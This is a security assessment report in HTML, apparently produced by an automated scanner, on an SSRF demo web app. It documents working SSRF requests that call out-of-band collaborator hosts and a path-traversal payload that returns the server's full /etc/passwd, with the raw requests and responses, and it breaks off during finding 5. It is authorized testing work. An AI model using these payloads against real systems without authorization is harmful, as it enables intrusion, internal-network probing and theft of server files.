@@ -1,0 +1,458 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqxnuc6b-8mgr76</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [ssrf] Blind SSRF via `url` parameter in redirect.php</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [burp✓] Out-of-band resource load (HTTP)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#d32f2f">HIGH</span> [burp✓] File path traversal</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Apache version and internal IP/port disclosed in error pages</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Input returned in response (reflected)</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] External service interaction (DNS)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqxnuc6b-8mgr76</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32798/</code></td></tr>
+<tr><td>Started</td><td>2026-06-28T10:43:01.498Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>4 mapped · 4 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>6</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32798</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>6 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">3</b> high</span><span><b style="color:#c9a227">1</b> low</span><span><b style="color:#5f7d8c">2</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [ssrf] Blind SSRF via `url` parameter in redirect.php</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32798/</div>
+<div class="desc">The `url` GET parameter is fetched server-side without restriction. Submitting an attacker-controlled URL caused the server to perform out-of-band DNS lookups and an HTTP request to the Collaborator host (2 DNS + 1 HTTP interaction observed from IPs 27.80.249.86 / 27.83.152.211). The home page also hints at an internal service at http://internal-service reachable only from the server's network, making this a concrete internal-network pivot vector.</div>
+<div><b>Reproduction</b></div><pre>1. Navigate to http://target.local:32798/
+2. Submit the form with url=http://&lt;attacker-collaborator-host&gt;/
+3. Observe DNS and HTTP interactions arriving at the Collaborator host from the target server's IP.
+Alternatively: GET /redirect.php?url=http://internal-service/ to probe internal resources.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxnwzsu-7</code> — <code>artifacts/s-0001/ev-mqxnwzsu-7/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php?url=http://verdict-oob-noref-adrmq04n.invalid/ssrf-test HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 462
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:45:05 GMT
+keep-alive: timeout=5, max=94
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+[VERDICT-OOB] control: benign host, no callback expected</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxnx4ey-9</code> — <code>artifacts/s-0001/ev-mqxnx4ey-9/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php?url=http://adrmq04nkab3194acf4w02qmhdn7bw.oastify.com/ssrf-test HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 112
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:45:10 GMT
+keep-alive: timeout=5, max=92
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=adrmq04nkab3194acf4w02qmhdn7bw.oastify.com payload_id=adrmq04nkab3194acf4w02qmhdn7bw interactions=[DNS@2026-06-28T10:45:05.584Z from 27.80.249.86; DNS@2026-06-28T10:45:05.583Z from 27.80.249.86; HTTP@2026-06-28T10:45:06.145Z from 27.83.152.211] [read#1]</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxnx51i-a</code> — <code>artifacts/s-0001/ev-mqxnx51i-a/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php?url=http://adrmq04nkab3194acf4w02qmhdn7bw.oastify.com/ssrf-test HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 112
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:45:11 GMT
+keep-alive: timeout=5, max=91
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=adrmq04nkab3194acf4w02qmhdn7bw.oastify.com payload_id=adrmq04nkab3194acf4w02qmhdn7bw interactions=[DNS@2026-06-28T10:45:05.584Z from 27.80.249.86; DNS@2026-06-28T10:45:05.583Z from 27.80.249.86; HTTP@2026-06-28T10:45:06.145Z from 27.83.152.211] [read#2]</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [burp✓] Out-of-band resource load (HTTP)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">✅ AI-verified by active re-test: Control with no url param returned 'No URL provided.' (no fetch); url=http://example.com/ made the server fetch the external host and reflect its body ('Example Domain') identically across 2 replays, proving attacker-controlled out-of-band HTTP load (SSRF).
+
+It is possible to induce the application to retrieve the contents of an arbitrary external URL and return those contents in its own response.&lt;br&gt;&lt;br&gt;The payload &lt;b&gt;http://awanadp9li2nibjnrf8xqwhc63cx00yorciz8nx.oastify.com/&lt;/b&gt; was submitted in the &lt;b&gt;url&lt;/b&gt; parameter.&lt;br&gt;&lt;br&gt;The application performed an HTTP request to the specified domain. The response from that request was then included in the application's own response. (confidence: CERTAIN) @ http://target.local:32798/redirect.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo6y0k-11</code> — <code>artifacts/_/ev-mqxo6y0k-11/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php HTTP/1.1
+Host: target.local:32798
+
+GET /redirect.php?url=http%3a%2f%2fawanadp9li2nibjnrf8xqwhc63cx00yorciz8nx.oastify.com%2f HTTP/1.1
+Host: target.local:32798
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 10:51:43 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 121
+Content-Type: text/html; charset=UTF-8
+
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;56i7oo19x8gt40k9aarj8zzjmgvqglgjfigz&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/pre&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo7r07-14</code> — <code>artifacts/_/ev-mqxo7r07-14/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 16
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:53:26 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+x-powered-by: PHP/7.4.33
+
+No URL provided.</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo7skz-15</code> — <code>artifacts/_/ev-mqxo7skz-15/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php?url=http://example.com/ HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 437
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:53:28 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;&amp;lt;!doctype html&amp;gt;&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Example Domain&amp;lt;/title&amp;gt;&amp;lt;link rel=&amp;quot;icon&amp;quot; href=&amp;quot;data:,&amp;quot;&amp;gt;&amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt;&amp;lt;style&amp;gt;body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;div&amp;gt;&amp;lt;h1&amp;gt;Example Domain&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;This domain is for use in documentation examples without needing permission. Avoid use in operations.&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;quot;https://iana.org/domains/example&amp;quot;&amp;gt;Learn more&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/pre&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo7z8a-16</code> — <code>artifacts/_/ev-mqxo7z8a-16/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php?url=http://example.com/ HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 437
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:53:37 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;&amp;lt;!doctype html&amp;gt;&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Example Domain&amp;lt;/title&amp;gt;&amp;lt;link rel=&amp;quot;icon&amp;quot; href=&amp;quot;data:,&amp;quot;&amp;gt;&amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt;&amp;lt;style&amp;gt;body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;div&amp;gt;&amp;lt;h1&amp;gt;Example Domain&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;This domain is for use in documentation examples without needing permission. Avoid use in operations.&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;quot;https://iana.org/domains/example&amp;quot;&amp;gt;Learn more&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/pre&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [burp✓] File path traversal</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">✅ AI-verified by active re-test: Control url=test returned a file_get_contents 'failed to open stream' warning with empty &lt;pre&gt;&lt;/pre&gt;; the ../x16 /etc/passwd payload returned the full passwd file (root:x:0:0:...) identically on two replays, proving unsanitized local file read via traversal.
+
+The &lt;b&gt;url&lt;/b&gt; parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.&lt;br&gt;&lt;br&gt;The payload &lt;b&gt;../../../../../../../../../../../../../../../../etc/passwd&lt;/b&gt; was submitted in the url parameter. The requested file was returned in the application's response. (confidence: FIRM) @ http://target.local:32798/redirect.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo6y0p-12</code> — <code>artifacts/_/ev-mqxo6y0p-12/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php HTTP/1.1
+Host: target.local:32798
+
+GET /redirect.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Host: target.local:32798
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Jun 2026 10:52:10 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 957
+Content-Type: text/html; charset=UTF-8
+
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+&lt;/pre&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo8h0h-17</code> — <code>artifacts/_/ev-mqxo8h0h-17/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php?url=test HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 163
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:54:00 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  file_get_contents(test): failed to open stream: No such file or directory in &lt;b&gt;/var/www/html/redirect.php&lt;/b&gt; on line &lt;b&gt;6&lt;/b&gt;&lt;br /&gt;
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;&lt;/pre&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo8ika-18</code> — <code>artifacts/_/ev-mqxo8ika-18/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 398
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:54:02 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+&lt;/pre&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo8k4n-19</code> — <code>artifacts/_/ev-mqxo8k4n-19/</code></div><div class="lbl">REQUEST</div><pre>GET /redirect.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 398
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:54:04 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;h1&gt;Fetched Content&lt;/h1&gt;&lt;pre&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+&lt;/pre&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 4. [info-disclosure] Apache version and internal IP/port disclosed in error pages</h3>
+<div class="kv">Screen: <code>s-0003</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32798/</div>
+<div class="desc">Apache-generated error pages (403 on /server-status, 404 on /server-info) include an `&lt;address&gt;` footer that discloses the exact server version string (`Apache/2.4.54 (Debian)`) and the internal host + port (`target.local Port 32798`). The 200 application response for the root page does not contain this information, confirming it originates from Apache's default error templates rather than the application. Root cause: Apache `ServerTokens` defaults to `Full` and `ServerSignature` is `On`. An attacker can use the version to look up applicable CVEs. Fix: set `ServerTokens Prod` and `ServerSignature Off` in the Apache configuration.</div>
+<div><b>Reproduction</b></div><pre>1. Send `GET /server-status HTTP/1.1` without authentication.
+2. Observe the 403 response body — the `&lt;address&gt;` footer contains `Apache/2.4.54 (Debian) Server at target.local Port 32798`.
+3. Repeat for `/server-info` (returns 404 with the same footer).
+Contrast: `GET /` returns a 200 application page with no version disclosure.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo1787-p</code> — <code>artifacts/s-0003/ev-mqxo1787-p/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 651
+content-type: text/html; charset=UTF-8
+date: Sun, 28 Jun 2026 10:48:21 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;SSRF Demo&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Company portal&lt;/h1&gt;
+    &lt;p&gt;Additional information is available internally for our employees at http://internal-service&lt;/br&gt;
+    The service is only accessible from our internal network.&lt;/p&gt;
+    &lt;/br&gt;
+    &lt;form action=&quot;redirect.php&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;url&quot;&gt;Enter URL to fetch:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;url&quot; name=&quot;url&quot; placeholder=&quot;http://example.com&quot;&gt;
+        &lt;button type=&quot;submit&quot;&gt;Fetch URL&lt;/button&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo0cz6-o</code> — <code>artifacts/s-0003/ev-mqxo0cz6-o/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 10:47:42 GMT
+keep-alive: timeout=5, max=68
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32798&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqxo17p2-q</code> — <code>artifacts/s-0003/ev-mqxo17p2-q/</code></div><div class="lbl">REQUEST</div><pre>GET /server-status HTTP/1.1
+Host: target.local:32798
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 403
+connection: Keep-Alive
+content-length: 282
+content-type: text/html; charset=iso-8859-1
+date: Sun, 28 Jun 2026 10:48:22 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;403 Forbidden&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Forbidden&lt;/h1&gt;
+&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32798&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 5. [burp] Input returned in response (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The value of the &lt;b&gt;url&lt;/b&gt; request parameter is copied into the application's response. (confidence: CERTAIN) @ http://target.local:32798/redirect.php</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
